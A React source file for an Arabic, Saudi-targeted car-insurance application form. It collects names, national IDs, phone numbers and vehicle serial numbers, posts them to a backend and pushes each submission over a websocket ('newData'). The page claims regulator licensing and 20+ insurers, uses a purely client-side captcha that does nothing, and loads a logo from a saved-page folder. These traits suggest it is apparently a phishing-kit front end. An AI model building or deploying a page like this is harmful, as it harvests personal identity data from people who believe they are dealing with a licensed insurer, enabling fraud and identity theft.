import axios from "axios";
import React, { useState, useEffect } from "react";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { FaShieldHalved, FaUser } from "react-icons/fa6";
import { RxHamburgerMenu } from "react-icons/rx";
import ApplyMarketingSections from "../components/ApplyMarketingSections";

const Apply = ({ setLoading, loading }) => {
  const [tab, setTab] = useState("new"); // "new" or "transfer"
  const [step, setStep] = useState(1);
  const [error, setError] = useState("");
  const navigate = useNavigate();

  // Dynamic Captcha
  const [captchaText, setCaptchaText] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");

  const refreshCaptcha = () => {
    setCaptchaText(Math.floor(1000 + Math.random() * 9000).toString());
    setCaptchaInput("");
  };

  useEffect(() => {
    refreshCaptcha();
  }, [tab, step]);

  // Form State
  const [formData, setFormData] = useState({
    form_type: "new_insurance",
    name: "",
    national_id: "",
    buyer_natID: "",
    seller_natID: "",
    phone: "",
    serialNumber: "",

    tameenFor: "ضد الغير", // insurance_type
    startedDate: "", // policy_start_date
    nationality: "",
    purpose_of_use: "", // vehicle_purpose
    car_year: "", // manfactYear
    carPrice: "", // estimated_value
    tameenAllType: "الورشة", // repair_method
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const validateID = (id) => {
    return /^[12]\d{9}$/.test(id);
  };

  const nextStep = () => {
    setError("");
    if (tab === "new") {
      if (
        !formData.name ||
        !formData.national_id ||
        !formData.phone ||
        !formData.serialNumber
      ) {
        return setError("الرجاء تعبئة جميع الحقول الأساسية.");
      }
      if (!validateID(formData.national_id)) {
        return setError(
          "رقم الهوية غير صحيح، يجب أن يتكون من 10 أرقام ويبدأ بـ 1 أو 2",
        );
      }
    } else {
      if (
        !formData.buyer_natID ||
        !formData.seller_natID ||
        !formData.name ||
        !formData.phone ||
        !formData.serialNumber
      ) {
        return setError("الرجاء تعبئة جميع الحقول الأساسية.");
      }
      if (!validateID(formData.buyer_natID)) {
        return setError(
          "رقم هوية المشتري غير صحيح، يجب أن يتكون من 10 أرقام ويبدأ بـ 1 أو 2",
        );
      }
      if (!validateID(formData.seller_natID)) {
        return setError(
          "رقم هوية البائع غير صحيح، يجب أن يتكون من 10 أرقام ويبدأ بـ 1 أو 2",
        );
      }
    }
    setStep(2);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");

    if (captchaInput !== captchaText) {
      refreshCaptcha();
      return setError("رمز التحقق خاطئ");
    }

    setLoading(true);

    try {
      const { data } = await axios.post(api_route + "/reg", formData);
      socket.emit("newData", data);

      if (formData.tameenFor === "شامل") {
        navigate(`/comprehensive_offers?data=${JSON.stringify(data)}`);
      } else if (formData.tameenFor === "مميز") {
        navigate(`/special_offers?data=${JSON.stringify(data)}`);
      } else {
        navigate(`/third_party_offers?data=${JSON.stringify(data)}`);
      }
      queueMicrotask(() => {
        window.scrollTo({ top: 0, left: 0, behavior: "auto" });
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;
      });
    } catch {
      setError("حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full flex flex-col font-[Tajawal] bg-[#f4f7f6] overflow-x-hidden min-h-screen justify-center items-center ">
      {/* Loading Modal Overlay */}
      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-40 backdrop-blur-sm">
          <div className="bg-white p-8 border-0 shadow-2xl rounded-2xl flex flex-col items-center justify-center w-4/5 max-w-sm">
            <TailSpin
              height="60"
              width="60"
              color="#f8a52c"
              ariaLabel="loading"
            />
            <h5 className="font-bold text-dark mt-4 text-xl tracking-tight text-center">
              جاري البحث عن أفضل العروض...
            </h5>
            <p className="text-gray-500 mt-2 text-center text-sm">
              يرجى الانتظار، قد يستغرق هذا بضع ثوانٍ
            </p>
          </div>
        </div>
      )}

      {/* Navbar */}
      <nav className="bg-white shadow-[0_2px_15px_rgba(0,0,0,0.05)] py-2 w-full z-20">
        <div className="flex justify-center items-center mx-auto px-4">
          <img
            src="/index_files/myclogo.jpg"
            alt="Logo"
            className="h-11 ml-2"
          />
        </div>
      </nav>

      {/* Hero */}
      <div className="relative z-10  overflow-hidden rounded-t-[15px] md:rounded-t-[20px] rounded-b-[15px] md:rounded-b-[20px] bg-gradient-to-br from-[#0a2744] via-[#0d3550] to-[#051a2a] text-white w-11/12 my-2 ">
        <div
          className="pointer-events-none absolute inset-0 opacity-[0.35]"
          style={{
            backgroundImage:
              "radial-gradient(circle at 1px 1px, rgba(255,255,255,0.12) 1px, transparent 0)",
            backgroundSize: "22px 22px",
          }}
        />
        <div className="pointer-events-none absolute -right-24 top-1/2 h-[420px] w-[420px] -translate-y-1/2 rounded-full border border-white/[0.06]" />
        <div className="pointer-events-none absolute -left-16 bottom-[-80px] h-[200px] w-[200px] rounded-full border border-white/[0.05]" />

        <div
          className="container relative mx-auto max-w-[900px] px-5  py-10 text-right md:px-6 md:pb-20 "
          dir="rtl"
        >
          <div className="mb-6 flex flex-wrap items-center justify-start gap-x-3 gap-y-2 text-sm text-white/90 md:text-[15px]">
            <span className="inline-flex items-center gap-2">
              <span className="h-2 w-2 shrink-0 rounded-full bg-[#3dd9a0] shadow-[0_0_12px_rgba(61,217,160,0.65)]" />
              <span className="font-semibold">منصة مقارنة التأمين الأولى</span>
            </span>
            <span className="hidden text-white/30 sm:inline">|</span>
            <span className="inline-flex items-center gap-2 text-white/75">
              <FaShieldHalved
                className="h-4 w-4 shrink-0 text-[#8ec5ff]"
                aria-hidden
              />
              <span>مرخصة من ساما</span>
            </span>
          </div>

          <h1 className="mb-3 font-extrabold  tracking-tight text-white md:text-5xl text-[1.65rem] sm:text-4xl">
            قارن، أمّن، واستلم وثيقتك
            <br />
            خلال دقائق
          </h1>
          <p className="mb-8 max-w-xl text-[15px] leading-relaxed text-white/55 md:text-lg">
            عروض فورية من أكثر من 20 شركة تأمين معتمدة
          </p>

          <div className="flex flex-wrap items-center justify-start gap-x-3 gap-y-1  text-sm text-white/90 md:text-[15px]">
            <span className="inline-flex items-center gap-2">
              <span className="h-2 w-2 shrink-0 rounded-full bg-[#3dd9a0] shadow-[0_0_10px_rgba(61,217,160,0.65)]" />
              <span className="font-semibold">عروض فورية</span>
            </span>
            <span className="text-white/30">|</span>
            <span className="h-2 w-2 shrink-0 rounded-full bg-[#3dd9a0] shadow-[0_0_10px_rgba(61,217,160,0.65)]" />
            <span className="font-semibold text-white/90">20+ شركة تأمين</span>
          </div>
        </div>
      </div>

      <style
        dangerouslySetInnerHTML={{
          __html: `
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        .services-strip::-webkit-scrollbar { display: none; }
        .services-strip { -ms-overflow-style: none; scrollbar-width: none; }
      `,
        }}
      />

      {/* Main Container */}
      <div className="container md:max-w-[900px] w-full mx-auto relative z-20 px-1 ">
        {/* Services Strip */}
        {/* <div className="bg-white  rounded-t-[15px] shadow-[0_-5px_20px_rgba(0,0,0,0.03)] flex justify-around items-center overflow-x-auto whitespace-nowrap border-b border-gray-100 services-strip pt-2">
          <div className="flex flex-col items-center" aria-current="true">
            <img
              src="1.jpeg"
              className=" h-20 w-20 scale-110 object-contain"
              alt=""
            />
          </div>
          <div className="flex flex-col items-center" aria-disabled="true">
            <img
              src="2.jpeg"
              className=" h-12 w-10 object-contain opacity-50 grayscale"
              alt=""
            />
            <span className="text-[10px] font-semibold  text-gray-400">
              طبى{" "}
            </span>
          </div>
          <div className="flex flex-col items-center" aria-disabled="true">
            <img
              src="3.jpeg"
              className=" h-12 w-10 object-contain opacity-50 grayscale"
              alt=""
            />
            <span className="text-[10px] font-semibold text-gray-400">
              اخطاء طبية
            </span>
          </div>
          <div className="flex flex-col items-center" aria-disabled="true">
            <img
              src="4.jpeg"
              className=" h-12 w-10 object-contain opacity-50 grayscale"
              alt=""
            />
            <span className="text-[10px] font-semibold text-gray-400">
              السفر
            </span>
          </div>
          <div className="flex flex-col items-center " aria-disabled="true">
            <img
              src="5.jpeg"
              className=" h-12 w-10 object-contain opacity-50 grayscale"
              alt=""
            />
            <span className="text-[10px] font-semibold text-gray-400">
              العماله المنزليه
            </span>
          </div>
        </div> */}

        {/* Form Card */}
        <div className="bg-white p-5 md:p-8 rounded-[20px] shadow-[0_15px_40px_rgba(0,0,0,0.08)] mb-10">
          {/* Tabs */}
          <div className="flex gap-3 justify-center mb-6 w-full">
            <button
              className={`flex-1 py-3 px-4 font-bold rounded-xl transition-all duration-300 border border-transparent ${tab === "new" ? "bg-[#0f4c72] text-white shadow-[0_5px_15px_rgba(15,76,114,0.3)]" : "bg-[#f1f3f5] text-gray-600 hover:bg-gray-200"}`}
              onClick={() => {
                setTab("new");
                setStep(1);
                setFormData({ ...formData, form_type: "new_insurance" });
                setError("");
              }}
              type="button"
            >
              تأمين جديد
            </button>
            <button
              className={`flex-1 py-3 px-4 font-bold rounded-xl transition-all duration-300 border border-transparent ${tab === "transfer" ? "bg-[#0f4c72] text-white shadow-[0_5px_15px_rgba(15,76,114,0.3)]" : "bg-[#f1f3f5] text-gray-600 hover:bg-gray-200"}`}
              onClick={() => {
                setTab("transfer");
                setStep(1);
                setFormData({ ...formData, form_type: "transfer_ownership" });
                setError("");
              }}
              type="button"
            >
              نقل ملكية
            </button>
          </div>

          <form onSubmit={handleSubmit} autoComplete="off" dir="rtl">
            {/* Step 1 */}
            {step === 1 && (
              <div className="animate-fade-in">
                <div className="text-[#0f4c72] text-lg gap-x-2 flex items-center  pb-2 border-b-2 border-[#f1f3f5] mb-5">
                  <FaUser />{" "}
                  <span style={{ fontWeight: "800" }}>
                    {" "}
                    الخطوة 1:{" "}
                    {tab === "new" ? "البيانات الأساسية" : "أطراف المبايعة"}
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {tab === "new" ? (
                    <>
                      <div className="flex flex-col">
                        <label
                          className="text-[13px] font-bold text-[#0f4c72] mb-1"
                          style={{ fontWeight: "800" }}
                        >
                          الاسم الكامل
                        </label>
                        <input
                          type="text"
                          name="name"
                          value={formData.name}
                          onChange={handleChange}
                          placeholder="كما في الهوية"
                          className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all"
                          required
                        />
                      </div>
                      <div className="flex flex-col">
                        <label
                          className="text-[13px] font-bold text-[#0f4c72] mb-1"
                          style={{ fontWeight: "800" }}
                        >
                          رقم الهوية / الإقامة
                        </label>
                        <input
                          type="tel"
                          name="national_id"
                          value={formData.national_id}
                          onChange={handleChange}
                          placeholder="10 أرقام"
                          maxLength="10"
                          inputMode="numeric"
                          className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all"
                          required
                        />
                      </div>
                    </>
                  ) : (
                    <>
                      <div className="flex flex-col">
                        <label
                          className="text-[13px] font-bold text-[#0f4c72] mb-1"
                          style={{ fontWeight: "800" }}
                        >
                          رقم هوية المشتري
                        </label>
                        <input
                          type="tel"
                          name="buyer_natID"
                          value={formData.buyer_natID}
                          onChange={handleChange}
                          placeholder="10 أرقام"
                          maxLength="10"
                          inputMode="numeric"
                          className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all"
                          required
                        />
                      </div>
                      <div className="flex flex-col">
                        <label
                          className="text-[13px] font-bold text-[#0f4c72] mb-1"
                          style={{ fontWeight: "800" }}
                        >
                          رقم هوية البائع
                        </label>
                        <input
                          type="tel"
                          name="seller_natID"
                          value={formData.seller_natID}
                          onChange={handleChange}
                          placeholder="10 أرقام"
                          maxLength="10"
                          inputMode="numeric"
                          className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all"
                          required
                        />
                      </div>
                      <div className="flex flex-col">
                        <label
                          className="text-[13px] font-bold text-[#0f4c72] mb-1"
                          style={{ fontWeight: "800" }}
                        >
                          اسم المشتري
                        </label>
                        <input
                          type="text"
                          name="name"
                          value={formData.name}
                          onChange={handleChange}
                          placeholder="الاسم الكامل"
                          className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all"
                          required
                        />
                      </div>
                    </>
                  )}

                  <div className="flex flex-col">
                    <label
                      className="text-[13px] font-bold text-[#0f4c72] mb-1"
                      style={{ fontWeight: "800" }}
                    >
                      رقم الجوال
                    </label>
                    <input
                      type="tel"
                      name="phone"
                      value={formData.phone}
                      onChange={handleChange}
                      placeholder="05xxxxxxxx"
                      maxLength="10"
                      inputMode="numeric"
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all"
                      required
                    />
                  </div>

                  <div
                    className={`flex flex-col ${tab === "transfer" ? "md:col-span-2" : ""}`}
                  >
                    <label
                      className="text-[13px] font-bold text-[#0f4c72] mb-1"
                      style={{ fontWeight: "800" }}
                    >
                      الرقم التسلسلي / الجمركي
                    </label>
                    <div className="flex">
                      <input
                        type="tel"
                        name="serialNumber"
                        value={formData.serialNumber}
                        onChange={handleChange}
                        placeholder="الرقم الموجود في الاستمارة"
                        maxLength="15"
                        className="h-12 px-4 rounded-xl border border-gray-300 focus:border-l focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all w-full flex-grow z-10"
                        required
                      />
                    </div>
                  </div>
                </div>

                {error && (
                  <div className="text-red-500 text-sm mt-3 font-bold text-center bg-red-50 p-2 rounded-lg">
                    {error}
                  </div>
                )}

                <button
                  type="button"
                  onClick={nextStep}
                  className="w-full bg-[#f8a52c] hover:bg-[#e08e1a] text-white font-extrabold text-lg py-3 rounded-xl mt-6 shadow-[0_4px_15px_rgba(248,165,44,0.4)] hover:-translate-y-0.5 transition-all outline-none"
                >
                  التالي
                </button>
              </div>
            )}

            {/* Step 2 */}
            {step === 2 && (
              <div className="animate-fade-in">
                <div className="text-[#0f4c72] text-lg font-extrabold pb-2 border-b-2 border-[#f1f3f5] mb-5">
                  <i className="fas fa-file-contract ml-2"></i>
                  الخطوة 2: بيانات التأمين والمركبة
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex flex-col">
                    <label className="text-[13px] font-bold text-[#0f4c72] mb-1">
                      نوع التأمين
                    </label>
                    <select
                      name="tameenFor"
                      value={formData.tameenFor}
                      onChange={handleChange}
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all bg-white"
                      required
                    >
                      <option value="ضد الغير">ضد الغير</option>
                      <option value="مميز">مميز</option>
                      <option value="شامل">شامل</option>
                    </select>
                  </div>

                  <div className="flex flex-col">
                    <label className="text-[13px] font-bold text-[#0f4c72] mb-1">
                      تاريخ بدء الوثيقة
                    </label>
                    <input
                      type="date"
                      name="startedDate"
                      value={formData.startedDate}
                      onChange={handleChange}
                      min={new Date().toISOString().split("T")[0]}
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all text-right"
                      required
                    />
                  </div>

                  {tab === "new" && (
                    <div className="flex flex-col">
                      <label className="text-[13px] font-bold text-[#0f4c72] mb-1">
                        الجنسية
                      </label>

                      <select
                        name="nationality"
                        value={formData.nationality}
                        onChange={handleChange}
                        className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all bg-white text-right"
                        required
                      >
                        <option value="" disabled hidden>
                          اختر الجنسية
                        </option>
                        <option value="سعودي">سعودي</option>
                        <option value="مقيم">مقيم</option>
                      </select>
                    </div>
                  )}

                  <div className="flex flex-col">
                    <label className="text-[13px] font-bold text-[#0f4c72] mb-1">
                      الغرض من الاستخدام
                    </label>
                    <select
                      name="purpose_of_use"
                      value={formData.purpose_of_use}
                      onChange={handleChange}
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all bg-white"
                      required
                    >
                      <option value="" disabled hidden>
                        إختر
                      </option>
                      <option value="شخصي">شخصي</option>
                      <option value="تجاري">تجاري</option>
                      <option value="تأجير">تأجير</option>
                      <option value="نقل ركاب (كريم/أوبر)">
                        نقل ركاب (كريم/أوبر)
                      </option>
                      <option value="نقل بضائع">نقل بضائع</option>
                    </select>
                  </div>

                  <div className="flex flex-col">
                    <label className="text-[13px] font-bold text-[#0f4c72] mb-1">
                      سنة الصنع
                    </label>
                    <select
                      name="car_year"
                      value={formData.car_year}
                      onChange={handleChange}
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all bg-white"
                      required
                    >
                      <option value="" disabled hidden>
                        إختر
                      </option>
                      {Array.from(
                        { length: 2026 - 1930 + 1 },
                        (_, i) => 2026 - i,
                      ).map((year) => (
                        <option key={year} value={year}>
                          {year}
                        </option>
                      ))}
                    </select>
                  </div>

                  <div className="flex flex-col">
                    <label className="text-[13px] font-bold text-[#0f4c72] mb-1">
                      القيمة التقديرية (ريال)
                    </label>
                    <input
                      type="number"
                      name="carPrice"
                      value={formData.carPrice}
                      onChange={handleChange}
                      placeholder="مثلاً: 50000"
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all"
                      required
                    />
                  </div>

                  <div className="flex flex-col">
                    <label className="text-[13px] font-bold text-[#0f4c72] mb-1">
                      مكان الإصلاح
                    </label>
                    <select
                      name="tameenAllType"
                      value={formData.tameenAllType}
                      onChange={handleChange}
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all bg-white"
                      required
                    >
                      <option value="الورشة">الورشة</option>
                      <option value="الوكالة">الوكالة</option>
                    </select>
                  </div>
                </div>

                <div className="flex items-center gap-4 mt-6">
                  <div
                    onClick={refreshCaptcha}
                    className="w-5/12 bg-gray-200 text-gray-800 font-mono text-2xl font-bold tracking-[5px] rounded-xl flex items-center justify-center h-12 cursor-pointer relative overflow-hidden"
                    style={{
                      backgroundImage:
                        "linear-gradient(45deg, #eee 25%, #e4e4e4 25%, #e4e4e4 50%, #eee 50%, #eee 75%, #e4e4e4 75%, #e4e4e4 100%)",
                      backgroundSize: "20px 20px",
                    }}
                  >
                    <span className="relative z-10 p-1 bg-white/40 backdrop-blur-sm rounded">
                      {captchaText}
                    </span>
                  </div>
                  <div className="w-7/12">
                    <input
                      type="tel"
                      value={captchaInput}
                      onChange={(e) => setCaptchaInput(e.target.value)}
                      placeholder="أدخل الرمز"
                      maxLength="4"
                      className="h-12 px-4 rounded-xl border border-gray-300 focus:border-[#0f4c72] focus:ring-4 focus:ring-[#0f4c72]/10 outline-none transition-all w-full text-center font-bold text-lg tracking-widest"
                      required
                    />
                  </div>
                </div>

                {error && (
                  <div className="text-red-500  text-center bg-red-50 p-2 rounded-lg">
                    {error}
                  </div>
                )}

                <div className="flex gap-2 mt-6">
                  <button
                    type="button"
                    onClick={() => setStep(1)}
                    className="bg-gray-500 hover:bg-gray-600 text-white font-bold rounded-xl px-8 transition-colors outline-none shrink-0"
                  >
                    السابق
                  </button>
                  <button
                    type="submit"
                    className="flex-1 bg-[#f8a52c] hover:bg-[#e08e1a] text-white font-extrabold text-lg py-3 rounded-xl m-0 shadow-[0_4px_15px_rgba(248,165,44,0.4)] hover:-translate-y-0.5 transition-all outline-none"
                  >
                    إظهار العروض
                  </button>
                </div>
              </div>
            )}
          </form>

          <p className="text-center mt-5 text-gray-500 text-xs">
            بالضغط على إظهار العروض، أوافق على منح الشركة الحق في الاستعلام من
            الجهات المختصة عن بياناتي وبيانات المركبة.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Apply;
